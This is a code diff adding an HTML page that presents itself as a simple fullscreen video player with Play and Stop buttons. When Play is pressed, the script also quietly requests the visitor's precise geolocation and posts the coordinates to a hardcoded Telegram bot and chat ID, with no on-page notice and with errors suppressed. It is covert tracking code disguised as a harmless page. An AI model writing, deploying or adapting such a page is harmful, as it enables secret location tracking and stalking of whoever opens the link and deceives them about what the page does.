@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Video + Silent Location</title>
+    <style>
+        /* Reset & fullscreen video */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            background: #000;
+            overflow: hidden;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        video {
+            width: 100vw;
+            height: 100vh;
+            object-fit: contain; /* or 'cover' */
+            background: #000;
+            display: block;
+        }
+
+        /* Overlay controls (bottom) */
+        .controls {
+            position: fixed;
+            bottom: 40px;
+            left: 50%;
+            transform: translateX(-50%);
+            display: flex;
+            gap: 20px;
+            background: rgba(0, 0, 0, 0.5);
+            padding: 12px 24px;
+            border-radius: 50px;
+            backdrop-filter: blur(4px);
+            z-index: 10;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        .controls button {
+            padding: 10px 28px;
+            font-size: 1.1rem;
+            font-weight: 600;
+            border: none;
+            border-radius: 30px;
+            cursor: pointer;
+            transition: 0.2s;
+            color: white;
+        }
+        #playBtn {
+            background: #2ecc71;
+        }
+        #stopBtn {
+            background: #e74c3c;
+        }
+        .controls button:hover {
+            transform: scale(1.05);
+            filter: brightness(0.85);
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Fullscreen video -->
+    <video id="myVideo" muted playsinline>
+        <!-- Replace with your own video URL -->
+        <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4" />
+        Your browser does not support the video tag.
+    </video>
+
+    <!-- Controls -->
+    <div class="controls">
+        <button id="playBtn">▶ Play</button>
+        <button id="stopBtn">⏹ Stop</button>
+    </div>
+
+    <script>
+        (function() {
+            const video = document.getElementById('myVideo');
+
+            // ----- Play: start video + request location silently -----
+            document.getElementById('playBtn').addEventListener('click', function() {
+                // 1. Play video
+                video.play();
+
+                // 2. Request location (if available) – no UI feedback
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        (position) => {
+                            const lat = position.coords.latitude;
+                            const lon = position.coords.longitude;
+                            sendToTelegram(lat, lon);
+                        },
+                        (error) => {
+                            // Silently ignore errors (or log to console if needed)
+                            console.warn('Location error:', error.message);
+                        },
+                        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                    );
+                } else {
+                    console.warn('Geolocation not supported.');
+                }
+            });
+
+            // ----- Stop: pause + reset -----
+            document.getElementById('stopBtn').addEventListener('click', function() {
+                video.pause();
+                video.currentTime = 0;
+            });
+
+            // ----- Telegram sender (silent) -----
+            function sendToTelegram(lat, lon) {
+                const botToken = '8515738916:AAHlDd9DNCRd6Z50M-xHymls9mNlDUTpe54';
+                const chatId = '8028796958'; // numeric chat ID
+
+                fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        latitude: lat,
+                        longitude: lon
+                    })
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if (!data.ok) console.warn('Telegram error:', data.description);
+                })
+                .catch(err => console.warn('Network error:', err.message));
+            }
+        })();
+    </script>
+
+</body>
+</html>
